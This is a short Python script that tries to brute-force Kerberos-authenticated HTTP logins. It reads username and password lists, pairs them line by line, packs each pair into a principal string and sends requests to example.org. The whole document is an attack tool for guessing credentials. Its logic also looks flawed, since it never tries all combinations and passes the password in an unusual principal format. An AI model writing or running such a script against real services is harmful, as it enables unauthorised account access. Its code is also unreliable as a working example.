import requests
from requests_kerberos import HTTPKerberosAuth, REQUIRED

def bruteForce():
    usernameFile = open("usernames.txt", "r")
    passwordFile = open("passwords.txt", "r")
    usernameList = usernameFile.readlines()
    passwordList = passwordFile.readlines()

    for username, password in zip(usernameList, passwordList):
        print("Trying combination: {0}\t{1}".format(username.strip(), password.strip()))
        user_pass_combination = username.strip() + "@realm:" + password.strip()
        kerberos_auth = HTTPKerberosAuth(principal=user_pass_combination)
        r = requests.get("http://example.org", auth=kerberos_auth)
        print(r)

def main():
    bruteForce()

main()
